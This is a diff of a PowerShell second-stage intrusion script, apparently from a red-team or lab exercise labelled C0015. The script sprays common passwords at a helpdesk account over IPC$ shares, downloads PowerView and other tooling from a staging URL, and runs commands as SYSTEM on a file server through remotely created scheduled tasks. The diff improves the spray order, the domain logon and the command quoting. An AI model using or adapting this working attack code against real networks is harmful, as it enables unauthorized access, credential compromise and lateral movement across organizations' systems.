@@ -11,7 +11,7 @@ $log    = Join-Path $work 'stage2.log'
 $stage  = 'C:\Users\Public\C0015'
 $target = 'FS01'
 $user   = 'C0015\helpdesk'
-$cands  = @('Summer2026!', 'Password123!', 'Helpdesk2026!', 'Welcome1!')
+$cands  = @('Password123!', 'Helpdesk2026!', 'Welcome1!', 'Summer2026!')
 
 function W($s) { Add-Content -Path $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $s) }
 New-Item -ItemType Directory -Force -Path $work, $stage | Out-Null
@@ -19,9 +19,14 @@ W "=== stage2 start as $(whoami) ==="
 
 
 function Invoke-Remote($cmd, $label) {
-    & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Task /tr `"$cmd`" /sc once /st 23:59 /ru SYSTEM /rl HIGHEST /f" 2>&1 | Out-Null
+    # write the command to a file on the target and start that file, so no quoting reaches schtasks
+    $local = Join-Path $work ("task_" + ($label -replace '[^a-zA-Z0-9]', '') + ".cmd")
+    Set-Content $local $cmd -Encoding ASCII
+    $remoteCmd = "C:\ProgramData\C0015\task.cmd"
+    Copy-Item $local ("\\$target\C$\ProgramData\C0015\task.cmd") -Force
+    & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Task /tr `"$remoteCmd`" /sc once /st 23:59 /ru SYSTEM /rl HIGHEST /f" 2>&1 | Out-Null
     & cmd.exe /c "schtasks /run /s $target /u $user /p $pw /tn C0015Task" 2>&1 | Out-Null
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 4
     W "remote task: $label"
 }function Get-Staged($name, $dest) {
     try { Invoke-WebRequest -Uri "$base/$name" -OutFile $dest -UseBasicParsing -TimeoutSec 180; W "fetched $name"; $true }
@@ -41,11 +46,11 @@ Get-Staged 'PowerView.ps1' (Join-Path $work  'PowerView.ps1') | Out-Null
 # ---------------------------------------------------------------- spray the helpdesk account
 $pw = $null
 foreach ($c in $cands) {
-    & cmd.exe /c "net use \\DC01\IPC$ /user:$user $c" 2>&1 | Out-Null
+    & cmd.exe /c "net use \\WS01\IPC$ /user:$user $c" 2>&1 | Out-Null
     if ($LASTEXITCODE -eq 0) { $pw = $c; W "spray hit: $c"; break }
-    & cmd.exe /c "net use \\DC01\IPC$ /delete /y" 2>&1 | Out-Null
+    & cmd.exe /c "net use \\WS01\IPC$ /delete /y" 2>&1 | Out-Null
 }
-if (-not $pw) { W 'spray failed' }
+if (-not $pw) { W 'spray failed' } else { & cmd.exe /c "net use \\DC01\IPC$ /user:$user $pw" 2>&1 | Out-Null; W 'domain logon with the recovered password' }
 
 if ($pw) {
     # ------------------------------------------------------------ discovery and share enumeration
@@ -121,6 +126,8 @@ if ($pw) {
 }
 
 W "=== stage2 end ==="
+
+
 
 
 
